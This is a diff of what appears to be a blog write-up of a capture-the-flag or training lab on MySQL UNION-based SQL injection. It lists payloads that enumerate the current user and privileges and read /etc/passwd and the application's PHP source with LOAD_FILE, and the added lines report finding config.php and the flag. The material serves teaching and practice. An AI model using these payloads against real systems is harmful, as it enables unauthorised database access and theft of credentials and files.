@@ -52,21 +52,18 @@ Queries to find the current DB user:
 SELECT USER()
 SELECT CURRENT_USER()
 SELECT user from mysql.user
-
 ```
 
 UNION injection payload:
 
 ```sql
 cn' UNION SELECT 1, user(), 3, 4-- -
-
 ```
 
 or
 
 ```sql
 cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
-
 ```
 
 ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1713726897409/f0b017ad-6a59-4899-b5e7-5efd06266094.png align="center")
@@ -87,14 +84,12 @@ Example:
 
 ```sql
 SELECT super_priv FROM mysql.user
-
 ```
 
 UNION injection payload:
 
 ```sql
 cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
-
 ```
 
 * If there are multiple users, adding `WHERE user="root"` will show privileges only for the current `root` user:
@@ -102,7 +97,6 @@ cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
 
 ```sql
 cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
-
 ```
 
 Example:
@@ -117,7 +111,6 @@ Example:
 
 ```sql
 cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
-
 ```
 
 ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1713726921027/3f01a254-19ae-408d-89c4-1d45b0efb481.png align="left")
@@ -127,7 +120,6 @@ cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_priv
 
 ```sql
 cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
-
 ```
 
 Example:
@@ -148,7 +140,6 @@ Example:
 
 ```sql
 SELECT LOAD_FILE('/etc/passwd');
-
 ```
 
 Note: The file will only be readable if the OS user running MySQL has sufficient privileges.
@@ -157,7 +148,6 @@ UNION injection payload:
 
 ```sql
 cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
-
 ```
 
 Example:
@@ -180,7 +170,6 @@ UNION injection payload:
 
 ```sql
 cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
-
 ```
 
 Example:
@@ -193,6 +182,12 @@ Example:
 * The HTML source can be viewed by pressing \[Ctrl + U\]
     
 * The source code could be inspected further to find sensitive information like database connection credentials or additional vulnerabilities
+    
+* Found the config.php file is the file containing sensitive info by inspecting search.php file.
+    
+* <mark>Found the flag:</mark>
+    
+* ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1713728274097/0027a1aa-35ea-4535-a360-8e9e7ca523ef.png align="center")
     
 
 ## **Conclusion**
